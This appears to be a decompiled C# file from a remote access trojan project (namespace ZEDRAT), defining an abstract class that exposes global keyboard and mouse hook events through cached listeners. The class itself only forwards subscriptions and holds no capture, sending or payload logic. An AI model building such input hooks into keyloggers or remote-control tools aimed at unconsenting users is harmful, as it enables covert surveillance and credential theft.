using System;
using System.Windows.Forms;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal abstract class EventFacade : IKeyboardMouseEvents, IKeyboardEvents, IMouseEvents, IDisposable
	{
		private KeyListener m_KeyListenerCache;

		private MouseListener m_MouseListenerCache;

		public event KeyEventHandler KeyDown
		{
			add
			{
				this.GetKeyListener().KeyDown += value;
			}
			remove
			{
				this.GetKeyListener().KeyDown -= value;
			}
		}

		public event KeyPressEventHandler KeyPress
		{
			add
			{
				this.GetKeyListener().KeyPress += value;
			}
			remove
			{
				this.GetKeyListener().KeyPress -= value;
			}
		}

		public event KeyEventHandler KeyUp
		{
			add
			{
				this.GetKeyListener().KeyUp += value;
			}
			remove
			{
				this.GetKeyListener().KeyUp -= value;
			}
		}

		public event MouseEventHandler MouseMove
		{
			add
			{
				this.GetMouseListener().MouseMove += value;
			}
			remove
			{
				this.GetMouseListener().MouseMove -= value;
			}
		}

		public event EventHandler<MouseEventExtArgs> MouseMoveExt
		{
			add
			{
				this.GetMouseListener().MouseMoveExt += value;
			}
			remove
			{
				this.GetMouseListener().MouseMoveExt -= value;
			}
		}

		public event MouseEventHandler MouseClick
		{
			add
			{
				this.GetMouseListener().MouseClick += value;
			}
			remove
			{
				this.GetMouseListener().MouseClick -= value;
			}
		}

		public event MouseEventHandler MouseDown
		{
			add
			{
				this.GetMouseListener().MouseDown += value;
			}
			remove
			{
				this.GetMouseListener().MouseDown -= value;
			}
		}

		public event EventHandler<MouseEventExtArgs> MouseDownExt
		{
			add
			{
				this.GetMouseListener().MouseDownExt += value;
			}
			remove
			{
				this.GetMouseListener().MouseDownExt -= value;
			}
		}

		public event MouseEventHandler MouseUp
		{
			add
			{
				this.GetMouseListener().MouseUp += value;
			}
			remove
			{
				this.GetMouseListener().MouseUp -= value;
			}
		}

		public event EventHandler<MouseEventExtArgs> MouseUpExt
		{
			add
			{
				this.GetMouseListener().MouseUpExt += value;
			}
			remove
			{
				this.GetMouseListener().MouseUpExt -= value;
			}
		}

		public event MouseEventHandler MouseWheel
		{
			add
			{
				this.GetMouseListener().MouseWheel += value;
			}
			remove
			{
				this.GetMouseListener().MouseWheel -= value;
			}
		}

		public event MouseEventHandler MouseDoubleClick
		{
			add
			{
				this.GetMouseListener().MouseDoubleClick += value;
			}
			remove
			{
				this.GetMouseListener().MouseDoubleClick -= value;
			}
		}

		public void Dispose()
		{
			if (this.m_MouseListenerCache != null)
			{
				this.m_MouseListenerCache.Dispose();
			}
			if (this.m_KeyListenerCache != null)
			{
				this.m_KeyListenerCache.Dispose();
			}
		}

		private KeyListener GetKeyListener()
		{
			KeyListener keyListenerCache = this.m_KeyListenerCache;
			if (keyListenerCache != null)
			{
				return keyListenerCache;
			}
			return this.m_KeyListenerCache = this.CreateKeyListener();
		}

		private MouseListener GetMouseListener()
		{
			MouseListener mouseListenerCache = this.m_MouseListenerCache;
			if (mouseListenerCache != null)
			{
				return mouseListenerCache;
			}
			return this.m_MouseListenerCache = this.CreateMouseListener();
		}

		protected abstract MouseListener CreateMouseListener();

		protected abstract KeyListener CreateKeyListener();
	}
}
